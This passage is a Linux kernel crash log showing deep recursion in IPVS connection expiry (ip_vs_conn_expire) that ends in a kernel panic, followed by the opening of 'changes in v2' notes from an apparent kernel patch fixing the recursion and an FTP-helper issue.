[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   65.752171]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.318578]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.318578]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.318578]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   66.791461]  ? __pfx_refcount_dec_if_one (??:?)
[   66.791461]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   66.791461]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? update_se (fair.c:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? pick_task_fair (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? preempt_schedule (??:?)
[   67.728355]  ? preempt_schedule_thunk (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   67.728355]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   67.728355]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   67.728355]  ? __pfx_refcount_dec_if_one (??:?)
[   68.308238]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.308238]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.308238]  ? __pfx_refcount_dec_if_one (??:?)
[   68.308238]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.308238]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.308238]  ? __pfx_refcount_dec_if_one (??:?)
[   68.308238]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? update_stack_state (unwind_frame.c:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.366482]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.366482]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.366482]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? fib6_del (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? read_hpet (hpet.c:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? _raw_spin_trylock (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? stack_trace_save (??:?)
[   68.763958]  ? ftrace_graph_ret_addr (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? update_stack_state (unwind_frame.c:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? __pfx_refcount_dec_if_one (??:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
[   68.763958]  ? __pfx_ip_vs_conn_expire (usercopy_64.c:?)
[   68.763958]  ? ip_vs_conn_del (ip_vs_conn.c:?)
[   68.763958]  ? ip_vs_conn_net_cleanup (??:?)
[   68.763958]  ? __ip_vs_cleanup_batch (ip_vs_core.c:?)
[   68.763958]  ? __pfx___ip_vs_cleanup_batch (usercopy_64.c:?)
[   68.763958]  ? ops_undo_list (net_namespace.c:?)
[   68.763958]  ? __pfx_ops_undo_list (usercopy_64.c:?)
[   68.763958]  ? idr_destroy (??:?)
[   68.763958]  ? _raw_spin_lock (??:?)
[   68.763958]  ? cleanup_net (net_namespace.c:?)
[   68.763958]  ? __pfx_cleanup_net (usercopy_64.c:?)
[   68.763958]  ? __switch_to (??:?)
[   68.763958]  ? kick_pool_pick (workqueue.c:?)
[   68.763958]  ? __schedule (core.c:?)
[   68.763958]  ? process_scheduled_works (workqueue.c:?)
[   68.763958]  ? __pfx_process_scheduled_works (usercopy_64.c:?)
[   68.763958]  ? __pfx_cleanup_net (usercopy_64.c:?)
[   68.763958]  ? assign_work (workqueue.c:?)
[   68.763958]  ? worker_thread (workqueue.c:?)
[   68.763958]  ? __pfx_worker_thread (usercopy_64.c:?)
[   68.763958]  ? kthread (kthread.c:?)
[   68.763958]  ? __pfx_kthread (usercopy_64.c:?)
[   68.763958]  ? ret_from_fork (??:?)
[   68.763958]  ? __pfx_ret_from_fork (??:?)
[   68.763958]  ? native_load_tls (paravirt.c:?)
[   68.763958]  ? native_load_gs_index (paravirt.c:?)
[   68.763958]  ? __switch_to (??:?)
[   68.763958]  ? __pfx_kthread (usercopy_64.c:?)
[   68.763958]  ? ret_from_fork_asm (??:?)
[   68.763958]  </TASK>
[   68.763958] Modules linked in:
[   68.763958] ---[ end trace 0000000000000000 ]---
[   68.763958] RIP: 0010:_raw_spin_lock_irqsave (??:?)
[   68.763958] Code: 0f 1f 44 00 00 48 b8 00 00 00 00 00 fc ff df 55 48 89 e5 41 55 41 54 49 89 fc 53 48 8d 5d 88 48 c1 eb 03 48 01 d8 48 83 ec 60 <48> c7 45 88 b3 8a b5 41 48 c7 45 90 52 b6 6a 85 48 c7 45 98 e0 f2
All code
========
   0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   5:	48 b8 00 00 00 00 00 	movabs $0xdffffc0000000000,%rax
   c:	fc ff df 
   f:	55                   	push   %rbp
  10:	48 89 e5             	mov    %rsp,%rbp
  13:	41 55                	push   %r13
  15:	41 54                	push   %r12
  17:	49 89 fc             	mov    %rdi,%r12
  1a:	53                   	push   %rbx
  1b:	48 8d 5d 88          	lea    -0x78(%rbp),%rbx
  1f:	48 c1 eb 03          	shr    $0x3,%rbx
  23:	48 01 d8             	add    %rbx,%rax
  26:	48 83 ec 60          	sub    $0x60,%rsp
  2a:*	48 c7 45 88 b3 8a b5 	movq   $0x41b58ab3,-0x78(%rbp)		<-- trapping instruction
  31:	41 
  32:	48 c7 45 90 52 b6 6a 	movq   $0xffffffff856ab652,-0x70(%rbp)
  39:	85 
  3a:	48                   	rex.W
  3b:	c7                   	.byte 0xc7
  3c:	45 98                	rex.RB cwtl 
  3e:	e0 f2                	loopne 0x32

Code starting with the faulting instruction
===========================================
   0:	48 c7 45 88 b3 8a b5 	movq   $0x41b58ab3,-0x78(%rbp)
   7:	41 
   8:	48 c7 45 90 52 b6 6a 	movq   $0xffffffff856ab652,-0x70(%rbp)
   f:	85 
  10:	48                   	rex.W
  11:	c7                   	.byte 0xc7
  12:	45 98                	rex.RB cwtl 
  14:	e0 f2                	loopne 0x8
[   68.763958] RSP: 0018:ffffc900008d7fc0 EFLAGS: 00000286
[   68.763958] RAX: fffff5200011aff8 RBX: 1ffff9200011aff8 RCX: dffffc0000000000
[   68.763958] RDX: 1ffffffff0b02a1c RSI: ffffc900008d80c0 RDI: ffff88806ce2f440
[   68.763958] RBP: ffffc900008d8038 R08: 1ffff11002d4aa47 R09: ffffed1002d4aa48
[   68.763958] R10: ffffed1002d4aa47 R11: ffff888016a5523b R12: ffff88806ce2f440
[   68.763958] R13: ffff888016a552c0 R14: ffffed1002d4aa5c R15: 0000000000001280
[   68.763958] FS:  0000000000000000(0000) GS:ffff8880e57b9000(0000) knlGS:0000000000000000
[   68.763958] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   68.763958] CR2: ffffc900008d7fb8 CR3: 0000000005aa8000 CR4: 00000000000006f0
[   68.763958] Kernel panic - not syncing: Fatal exception in interrupt
[   68.763958] Kernel Offset: disabled
[   68.763958] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---
-----END crash log-----

changes in v2:
  - Use a repeat path for controller cleanup so expiration stays
    synchronous without recursive calls or extra timer ticks.
  - Extend the FTP-helper fix to active mode by rejecting the data port
    derived from a configured control port.
  - Replace the reproducer and crash evidence with the original passive
